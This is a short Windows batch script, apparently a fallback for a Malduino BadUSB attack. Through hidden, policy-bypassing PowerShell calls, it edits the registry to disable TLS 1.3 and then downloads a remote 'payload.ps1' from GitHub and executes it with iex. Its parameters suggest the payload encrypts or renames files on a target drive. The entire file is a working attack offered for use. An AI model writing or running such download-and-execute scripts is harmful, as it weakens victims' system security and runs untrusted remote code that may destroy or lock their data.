rem use this .bat on the windows computer when is not possible to connect the USB Malduino

cd %LOCALAPPDATA%

rem change windows registry ssl/tsl settings to allow executing powershell script directly from github or other url
powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {New-Item 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server' -Force}
powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {New-ItemProperty -path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force}
powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {New-ItemProperty -path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force}
powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {New-Item 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Client' -Force}
powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Client' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force}
powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Client' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force}
powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden {reg add HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319 /v SystemDefaultTlsVersions /t REG_DWORD /d 1 /f /reg:64}

rem run payload script
powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "$type='single_enc'; $file='test.txt'; $file_path='h:'; $show_screen='no'; (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/payload.ps1') | iex"
powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "$type='multi_ren'; $file='.db'; $file_path='h:'; $show_screen='yes'; (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/payload.ps1') | iex"

